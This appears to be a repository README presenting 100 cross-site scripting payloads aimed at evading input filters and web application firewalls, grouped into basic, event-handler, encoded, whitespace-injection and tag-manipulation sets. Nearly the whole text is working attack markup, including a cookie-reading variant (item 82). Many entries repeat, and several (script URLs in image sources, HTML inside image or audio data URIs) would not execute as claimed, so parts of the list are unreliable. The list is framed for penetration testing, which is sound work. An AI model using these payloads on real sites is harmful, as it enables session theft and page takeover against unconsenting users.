# XSS Payloads for Bypassing Filters and Firewalls

## Introduction

Cross-Site Scripting (XSS) is a common vulnerability that allows attackers to inject malicious scripts into web pages viewed by users. In response, many websites use filtering techniques and firewalls to block these malicious scripts. However, attackers can bypass these filters by using various encoding techniques, manipulating HTML tags, and exploiting event handlers.

This repository contains **100 XSS payloads** that are designed to bypass common XSS filters and web application firewalls (WAFs). These payloads employ techniques such as:
- Character encoding (e.g., Hexadecimal, Base64)
- Injecting whitespace (tabs, newlines)
- Manipulating HTML tags (e.g., nested tags, incomplete tags)
- Exploiting various event handlers (e.g., `onmouseover`, `onload`, `onclick`)
- Using **String.fromCharCode** for obfuscating the payload
- Combining different techniques for hybrid bypassing

Each of the payloads in this list targets specific techniques to test a web application's defenses. These payloads are useful for penetration testers and security researchers to assess the effectiveness of XSS protection mechanisms.

---

## XSS Payloads

### 1-20: Basic JavaScript Payloads
1. `<script>alert(1)</script>`
2. `<img src="x" onerror="alert(1)">`
3. `<svg/onload=alert(1)>`
4. `<iframe src="javascript:alert(1)"></iframe>`
5. `<body onload=alert(1)>`
6. `<a href="javascript:alert(1)">Click me</a>`
7. `<svg><desc><![CDATA[</desc><script>alert(1)//]]></script></svg>`
8. `<input onfocus="alert(1)">`
9. `<img src=x onmouseover=alert(1)>`
10. `<iframe srcdoc="<script>alert(1)</script>"></iframe>`
11. `<embed src="data:text/html,<script>alert(1)</script>">`
12. `<object data="data:text/html,<script>alert(1)</script>"></object>`
13. `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`
14. `<form><button formaction="javascript:alert(1)">Submit</button></form>`
15. `<math><mtext><script>alert(1)</script></mtext></math>`
16. `<xss><script>alert(1)</script></xss>`
17. `<textarea onfocus="alert(1)">`
18. `<a href="javascript:confirm(1)">Click</a>`
19. `<details ontoggle="alert(1)">`
20. `<marquee onstart="alert(1)">`

### 21-40: Event Handlers Payloads
21. `<img src=x onerror=alert(1)>`
22. `<div onmouseover="alert(1)">Hover me</div>`
23. `<input type="text" onfocus="alert(1)">`
24. `<body onload="alert(1)">`
25. `<a onmouseover="alert(1)">Hover me</a>`
26. `<button onclick="alert(1)">Click me</button>`
27. `<video src=x onerror=alert(1)>`
28. `<audio src=x onerror=alert(1)>`
29. `<form onsubmit="alert(1)">`
30. `<select onchange="alert(1)">`
31. `<keygen onfocus="alert(1)">`
32. `<label onmouseover="alert(1)">Hover here</label>`
33. `<a href="#" onmousedown="alert(1)">Click me</a>`
34. `<div onmouseout="alert(1)">`
35. `<p onmouseup="alert(1)">`
36. `<textarea onkeydown="alert(1)">`
37. `<textarea onkeyup="alert(1)">`
38. `<input type="text" onblur="alert(1)">`
39. `<input type="text" onfocus="alert(1)">`
40. `<iframe onload="alert(1)">`

### 41-60: Encoded Payloads (Hex, ASCII, Base64)
41. `<img src=&#x6A;avascript:alert(1)>`
42. `<a href="&#x6A;avascript:alert(1)">Click me</a>`
43. `<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>`
44. `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>`
45. `<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`
46. `<body onload="eval(atob('YWxlcnQoMSk='))">`
47. `<img src="&#106;avascript:alert(1)">`
48. `<a href="&#x6A;avascript:alert('XSS')">Click me</a>`
49. `<iframe srcdoc="<script>alert(1)</script>"></iframe>`
50. `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`
51. `<svg/onload="eval(atob('YWxlcnQoMSk='))">`
52. `<body onload="eval(atob('YWxlcnQoMSk='))">`
53. `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`
54. `<video src="data:video/mp4;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></video>`
55. `<audio src="data:audio/mp3;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></audio>`
56. `<math><mtext>&#x6A;avascript:alert(1)</mtext></math>`
57. `<img src="&#x6A;avascript:alert('XSS')">`
58. `<div onmouseover="eval(atob('YWxlcnQoMSk='))">Hover here</div>`
59. `<iframe src="data:text/html;base64,PHNjcmlwdD5jb25maXJtKDEpPC9zY3JpcHQ+"></iframe>`
60. `<img src="data:image/png;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`

### 61-80: Whitespace and Tab Injection Payloads
61. `<img src="java&#x09;script:alert(1)">`
62. `<a href="java&#x09;script:alert(1)">Click me</a>`
63. `<img src="java&#x0A;script:alert(1)">`
64. `<a href="java&#x0A;script:alert(1)">Click me</a>`
65. `<img src="java&#x0D;script:alert(1)">`
66. `<a href="java&#x0D;script:alert(1)">Click me</a>`
67. `<a href="java&#x0D;&#x0A;script:alert(1)">Click me</a>`
68. `<img src="java&#x09;&#x0D;script:alert(1)">`
69. `<a href="java&#x09;&#x0D;script:alert(1)">Click me</a>`
70. `<a href="java&#32;script:alert(1)">Click me</a>`
71. `<img src="java&#32;script:alert(1)">`
72. `<img src="jav&#x09;&#x0D;ascript:alert(1)">`
73. `<a href="jav&#x09;&#x0D;ascript:alert(1)">Click me</a>`
74. `<img src="jav&#x0A;&#x0D;ascript:alert(1)">`
75. `<a href="jav&#x0A;&#x0D;ascript:alert(1)">Click me</a>`
76. `<img src="jav&#x0A;ascript:alert(1)">`
77. `<a href="jav&#x0A;ascript:alert(1)">Click me</a>`
78. `<img src="jav&#x0D;ascript:alert(1)">`
79. `<a href="jav&#x0D;ascript:alert(1)">Click me</a>`
80. `<img src="jav&#x09;&#x0D;ascript:alert(1)">`

### 81-100: Tag Manipulation Payloads
81. `<scr<script>ipt>alert(1)</scr<script>ipt>`
82. `<scr<script>ipt>alert(document.cookie)</scr<script>ipt>`
83. `<svg><desc><![CDATA[</desc><script>alert(1)//]]></script></svg>`
84. `<xmp><iframe src="javascript:alert(1)"></iframe></xmp>`
85. `<math><annotation-xml encoding="text/html"><svg><script>alert(1)</script></svg></annotation-xml></math>`
86. `<xss><script>alert(1)</script></xss>`
87. `<iframe srcdoc="<scr<script>ipt>alert(1)</scr<script>ipt>"></iframe>`
88. `<iframe src="data:text/html,<scr<script>ipt>alert(1)</scr<script>ipt>"></iframe>`
89. `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`
90. `<object data="data:text/html,<scr<script>ipt>alert(1)</scr<script>ipt>"></object>`
91. `<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>`
92. `<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`
93. `<math><mtext><scr<script>ipt>alert(1)</scr<script>ipt></mtext></math>`
94. `<xss><scr<script>ipt>alert(1)</scr<script>ipt></xss>`
95. `<svg><script>alert(1)</script></svg>`
96. `<iframe src="javascript:alert(1)"></iframe>`
97. `<img src="x" onerror="alert(1)">`
98. `<a href="javascript:alert(1)">Click me</a>`
99. `<iframe onload="alert(1)">`
100. `<svg/onload=alert(1)>`
